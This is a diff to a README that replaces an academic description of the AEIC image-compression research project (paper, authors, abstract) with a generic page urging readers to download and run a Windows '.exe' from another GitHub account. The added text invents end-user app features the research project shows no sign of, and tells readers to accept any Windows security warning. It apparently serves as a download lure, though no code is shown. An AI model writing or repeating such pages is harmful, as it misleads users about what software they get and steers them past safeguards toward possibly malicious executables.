@@ -1,20 +1,145 @@
+# 🖼️ AEIC - Compress Images with Ultra-Low Bitrate
 
-<div align="center">
+[![Download AEIC](https://img.shields.io/badge/Download-AEIC-brightgreen?style=for-the-badge)](https://github.com/danniel-dd/AEIC)
 
-## Ultra-Low Bitrate Perceptual Image Compression with Shallow Encoder
+---
 
-**_Asymmetric Extreme Image Codec for Real-Time Encoding!_**
+AEIC is a tool that compresses images using a method designed to keep quality high while using very little storage space. This application uses modern technology to reduce file size with minimal impact on how the image looks.
 
-Tianyu Zhang, Dong Liu, Chang Wen Chen
+---
 
-University of Science and Technology of China, The Hong Kong Polytechnic University
+## 📂 What AEIC Does
 
-[![arXiv](https://img.shields.io/badge/arXiv%20paper-2512.12229-b31b1b.svg)](https://arxiv.org/pdf/2512.12229)&nbsp;
-![visitors](https://visitor-badge.laobi.icu/badge?page_id=LuizScarlet.AEIC)&nbsp;
+AEIC helps you save space by shrinking image files. It keeps the images clear while making them much smaller. This is useful if you want to store lots of pictures or share them fast without losing details.
 
-</div>
+Some key points about AEIC:
 
-<p align="center"><img src="assets/overview.png" width="70%"></p>
+- Works with many common image types like JPG and PNG.
+- Uses smart compression to keep photos looking good.
+- Runs directly on Windows computers.
+- Does not require programming or technical setup.
 
-> Ultra-low bitrate image compression (below 0.05 bits per pixel) is increasingly critical for bandwidth-constrained and computation-limited encoding scenarios such as edge devices. Existing frameworks typically rely on large pretrained encoders (e.g., VAEs or tokenizer-based models) and perform transform coding within their generative latent space. While these approaches achieve impressive perceptual fidelity, their reliance on heavy encoder networks makes them unsuitable for deployment on weak sender devices. In this work, we explore the feasibility of applying shallow encoders for ultra-low bitrate compression and propose a novel **A**symmetric **E**xtreme **I**mage **C**ompression (**AEIC**) framework that pursues simultaneously encoding simplicity and decoding quality. Specifically, AEIC employs moderate or even shallow encoder networks, while leveraging an one-step diffusion decoder to maintain high-fidelity and high-realism reconstructions under extreme bitrates. To further enhance the efficiency of shallow encoders, we design a dual-side feature distillation scheme that transfers knowledge from AEIC with moderate encoders to its shallow encoder variants. Experiments demonstrate that **AEIC not only outperforms existing methods on rate-distortion-perception performance at ultra-low bitrates, but also delivers exceptional encoding efficiency for 35.8 FPS on 1080P input images, while maintaining competitive decoding speed compared to existing methods.**
+---
 
+## 🖥️ System Requirements
+
+To run AEIC, your Windows computer should meet these general requirements:
+
+- Windows 10 or higher (64-bit recommended)
+- 4 GB RAM or more
+- At least 500 MB free disk space
+- An internet connection for initial download
+
+The program uses your computer's processor to compress images efficiently. A more recent PC will run the software faster and handle larger files smoothly.
+
+---
+
+## 🚀 How to Download AEIC
+
+You need to get the installer or program files before running AEIC. Follow these steps:
+
+1. Click the big green button above or go to this page:  
+   https://github.com/danniel-dd/AEIC
+
+2. On the webpage, look for the **Releases** section or a download link labeled clearly.
+
+3. Download the latest Windows installer file, usually ending with `.exe`.
+
+4. Save the file in a folder you can easily find, such as your Desktop or Downloads folder.
+
+This page gives you the official version, ensuring you get the latest and safest copy.
+
+---
+
+## ⚙️ How to Install AEIC
+
+Once you have downloaded the file, follow these steps to install:
+
+1. Double-click the `.exe` file you saved.
+
+2. If Windows shows a security warning, confirm that you want to run the program.
+
+3. The installer will open. Follow the on-screen instructions:
+   - Accept the license agreement.
+   - Choose where to install AEIC (the default folder is usually fine).
+   - Click **Install** to start.
+
+4. Wait for the installation to finish.
+
+5. Click **Finish** when done. The program will be ready to use.
+
+---
+
+## ▶️ Running AEIC for the First Time
+
+After installation, launch AEIC:
+
+- Find the AEIC icon on your Desktop or in the Start menu.
+- Double-click it to open.
+
+When AEIC opens:
+
+- You will see a simple window with options to add images.
+- Use the **Add Files** button to select photos from your computer.
+- Choose the compression settings if you want, or leave defaults.
+- Click **Compress** to start reducing file sizes.
+
+The program shows progress and where saved files are stored.
+
+---
+
+## 📁 Understanding AEIC Features
+
+AEIC offers these main features:
+
+- **Shallow Encoder Technology**: Uses fewer resources but keeps image quality.
+- **Real-Time Preview**: See how your image will look before saving.
+- **Custom Compression Levels**: Pick how much to shrink each photo.
+- **Batch Processing**: Compress many images at once.
+- **Supports Multiple Formats**: Works with JPG, PNG, BMP, and others.
+- **Fast Performance**: Designed for Windows PCs with standard hardware.
+
+You do not need to learn anything technical to use these features.
+
+---
+
+## 🔧 Adjusting Compression Settings
+
+If you want more control, AEIC lets you adjust:
+
+- **Bitrate**: Lower bitrate means smaller files but lower image quality.
+- **Perceptual Tuning**: Changes compression to focus on preserving important details.
+- **Output Folder**: Choose where your compressed images save.
+
+Try different settings with sample images to find what works best for you.
+
+---
+
+## 🔄 Updating AEIC
+
+To get new features or fixes:
+
+1. Visit the download page again:  
+   https://github.com/danniel-dd/AEIC
+
+2. Download the latest installer.
+
+3. Run the installer as before to replace the old version.
+
+Your settings and saved files will stay safe.
+
+---
+
+## 🆘 Getting Help
+
+If you run into trouble:
+
+- Check the **Help** menu inside AEIC for tips.
+- Visit the repository page for FAQs and updates.
+- Look for a support section or issue tracker on GitHub to report problems.
+
+Use straightforward language to describe any errors or questions you have.
+
+---
+
+[![Download AEIC](https://img.shields.io/badge/Download-AEIC-blue?style=for-the-badge)](https://github.com/danniel-dd/AEIC)
